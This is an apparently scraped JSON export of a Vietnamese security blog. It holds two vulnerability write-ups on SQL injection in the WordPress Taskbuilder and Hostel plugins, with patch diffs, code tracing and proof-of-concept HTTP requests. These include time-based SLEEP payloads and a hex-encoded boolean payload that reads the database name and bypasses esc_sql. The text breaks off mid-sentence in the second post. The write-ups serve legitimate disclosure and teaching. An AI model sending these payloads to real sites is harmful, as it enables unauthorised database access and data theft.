[{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Taskbuilder c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 4.0.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) v√† v4.0.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ x·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n '...'. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ OR, AND,...) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/admin/projects/get_users.php\nTrong phi√™n b·∫£n v4.0.1, bi·∫øn $proj_id sau khi escape ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o c√¢u truy v·∫•n m√† kh√¥ng c√≥ d·∫•u nh√°y ƒë∆°n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n·ªû b·∫£n v4.0.2, truy v·∫•n ƒë√£ ƒë∆∞·ª£c ƒëi·ªÅu ch·ªânh b·∫±ng c√°ch ƒë·∫∑t $proj_id trong d·∫•u nh√°y ƒë∆°n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.2\u0026rdquo; }\nB·∫£n v√° n√†y ƒë·∫£m b·∫£o r·∫±ng gi√° tr·ªã $proj_id sau khi escape ƒë∆∞·ª£c coi l√† m·ªôt chu·ªói literal, kh√¥ng th·ªÉ tho√°t ra kh·ªèi d·∫•u nh√°y ƒë∆°n ƒë·ªÉ ch√®n th√™m c√∫ ph√°p SQL, qua ƒë√≥ ngƒÉn ch·∫∑n t·∫•n c√¥ng SQL Injection.\nHow it work? File architecture:\nC·∫•u tr√∫c chung c·ªßa file hi·ªán t·∫°i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o n·ªôi dung ch√≠nh (body) c·ªßa modal ob_start(); // ... render HTML danh s√°ch users $body = ob_get_clean(); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o ph·∫ßn footer c·ªßa modal ob_start(); // ... render HTML c√°c n√∫t thao t√°c (Close, Save) $footer = ob_get_clean(); // Tr·∫£ d·ªØ li·ªáu JSON ƒë·ªÉ frontend hi·ªÉn th·ªã modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n$proj_id / $project: L·∫•y d·ªØ li·ªáu project t·ª´ database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay v√¨ xu·∫•t tr·ª±c ti·∫øp, gi√∫p gom n·ªôi dung v√†o bi·∫øn. $body / $footer: Ch·ª©a n·ªôi dung HTML ƒë·ªông c·ªßa modal. json_encode(): Tr·∫£ JSON cho client, c√≥ kh·∫£ nƒÉng ƒë∆∞·ª£c s·ª≠ d·ª•ng trong Ajax ƒë·ªÉ hi·ªÉn th·ªã modal m√† kh√¥ng c·∫ßn refresh trang. File n·∫±m trong th∆∞ m·ª•c includes cho th·∫•y r·∫±ng n√≥ s·∫Ω ƒë∆∞·ª£c g·ªçi ·ªü 1 ch·ª©c nƒÉng n√†o ƒë√≥ ·ªü n∆°i kh√°c. ƒê·ªÉ bi·∫øt ch·ª©c nƒÉng n√†o s·ª≠ d·ª•ng n√≥, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_users.php trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ N√≥ ƒë∆∞·ª£c include trong h√†m wppm_get_users() c·ªßa class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() l√† callback c·ªßa action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } {: file=\u0026ldquo;includes/class-wppm-admin.php v4.0.1\u0026rdquo; }\nadd_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. wp_ajax_wppm_get_users l√† t√™n hook Ajax, v·ªõi quy t·∫Øc ƒë·∫∑t t√™n: wp_ajax_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ƒë√£ ƒëƒÉng nh·∫≠p. wp_ajax_nopriv_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ch∆∞a ƒëƒÉng nh·∫≠p. ·ªû ƒë√¢y, action = wppm_get_users. Nghƒ©a l√† n·∫øu trong Ajax request b·∫°n g·ª≠i action=wppm_get_users t·ªõi admin-ajax.php, th√¨ WordPress s·∫Ω t√¨m callback t∆∞∆°ng ·ª©ng ƒë·ªÉ x·ª≠ l√Ω, ·ªü ƒë√¢y l√† wppm_get_users(). üëâ Ta ƒë√£ bi·∫øt ƒë∆∞·ª£c action = wppm_get_users, ki·ªÉm tra xem Ajax n√†o s·ª≠ d·ª•ng action n√†y b·∫±ng c√°ch t√¨m t·ª´ kh√≥a wppm_get_users tr√™n c√°c file .js trong th∆∞ m·ª•c ch·ª©a plugin.\nAction wppm_get_users l√† ph·∫ßn data trong request POST c·ªßa h√†m wppm_get_users()\nH√†m wppm_get_users() s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t trong HTML attribute c·ªßa ch·ª©c nƒÉng project\nT·∫°o project m·ªõi Truy c·∫≠p v√†o project ƒë√≥ Inspect code v√† t√¨m h√†m wppm_get_users s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t ·ªü ƒë√¢u, h√†nh ƒë·ªông n√†o s·∫Ω g·ªçi n√≥ üëâ Khi click v√†o icon b√™n c·∫°nh Users ajax s·∫Ω ho·∫°t ƒë·ªông, g·ª≠i request ƒë·∫øn server, l·∫•y danh s√°ch c√°c user tham gia project v√† m√£ HTML hi·ªÉn th·ªã n√≥.\nExploit Detect SQLi B·∫Øt request b·∫±ng BurpSuite, g·ª≠i request v·ªõi SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id ƒë√∫ng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† wordpress n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† w t∆∞∆°ng ·ª©ng v·ªõi m√£ HEX l√† 0x77 {: .prompt-info }\nS·ª≠ d·ª•ng SUBSTRING(STRING,1,1) ƒë·ªÉ l·∫•y k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa chu·ªói\n·ªû ƒë√¢y, $proj_id b·∫±ng 4 v√¨ SUBSTRING('wordpress',1,1)=0x77 l√† ƒë√∫ng n√™n SELECT l·∫•y gi√° tr·ªã ƒë√∫ng trong IF(condition, value if true, value if false), 4 l√† gi√° tr·ªã c√≥ th·ª±c trong database, n√™n response tr·∫£ v·ªÅ ch·ª©a danh s√°ch ng∆∞·ªùi tham gia d·ª± √°n\nS·ª≠ d·ª•ng HEX technique ƒë·ªÉ bypass h√†m esc_sql() ·ªü tr√™n, d√πng ƒë·ªÉ so s√°nh khi kh√¥ng s·ª≠ d√πng ƒë∆∞·ª£c '\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) V·ªõi proj_id kh√¥ng c√≥ th·ª±c trong database, response s·∫Ω tr·∫£ v·ªÅ k·∫øt qu·∫£ ch·ª©a None\nüëâ Ta ƒë√£ l·∫•y ƒë∆∞·ª£c k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa database name b·∫±ng k·ªπ thu·∫≠t boolean base\nproj_id ƒë√πng: response kh√¥ng ch·ª©a None proj_id sai: response ch·ª©a None C√≥ th·ªÉ s·ª≠ d·ª•ng k·ªπ thu·∫≠t time base nh∆∞ng khi dump s·ªë l∆∞·ª£ng l·ªõn data, th·ªùi gian dump s·∫Ω r·∫•t l√¢u {: .prompt-info }\nConclusion L·ªó h·ªïng CVE-2025-39569 trong plugin WordPress Taskbuilder xu·∫•t ph√°t t·ª´ vi·ªác thi·∫øu d·∫•u nh√°y ƒë∆°n '...' bao quanh d·ªØ li·ªáu ƒë·∫ßu v√†o trong c√¢u l·ªánh SQL, khi·∫øn d·ªØ li·ªáu ng∆∞·ªùi d√πng c√≥ th·ªÉ ƒë∆∞·ª£c di·ªÖn gi·∫£i nh∆∞ m·ªôt ph·∫ßn c·ªßa c√¢u l·ªánh SQL h·ª£p l·ªá.\nB·∫£n v√° ·ªü phi√™n b·∫£n 4.0.2 ƒë√£ kh·∫Øc ph·ª•c v·∫•n ƒë·ªÅ b·∫±ng c√°ch ƒë∆∞a $proj_id v√†o trong '...', ƒë·∫£m b·∫£o n√≥ lu√¥n ƒë∆∞·ª£c x·ª≠ l√Ω nh∆∞ m·ªôt literal string trong SQL.\nKey takeaways:\n∆Øu ti√™n s·ª≠ d·ª•ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay v√¨ t·ª± ch√®n d·ªØ li·ªáu v√†o query. ƒê·ªëi v·ªõi c√°c plugin WordPress, c·∫ßn test k·ªπ l∆∞·ª°ng c√°c Ajax endpoint v√¨ ƒë√¢y l√† n∆°i d·ªÖ xu·∫•t hi·ªán SQLi v√† XSS nh·∫•t. Ng∆∞·ªùi qu·∫£n tr·ªã c·∫ßn th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin/theme ƒë·ªÉ nh·∫≠n b·∫£n v√° k·ªãp th·ªùi. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-22-cve-2025-39569/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) v√† v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ \u003cstrong\u003ex·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o\u003c/strong\u003e tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n \u003ccode\u003e'...'\u003c/code\u003e. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"L·ªó h·ªïng trong plugin Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file controllers/bookings.php\nB·∫£n l·ªó h·ªïng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } B·∫£n v√°:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } üëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nHow it work? ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C√¢u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } ·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ l√†m s·∫°ch HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; 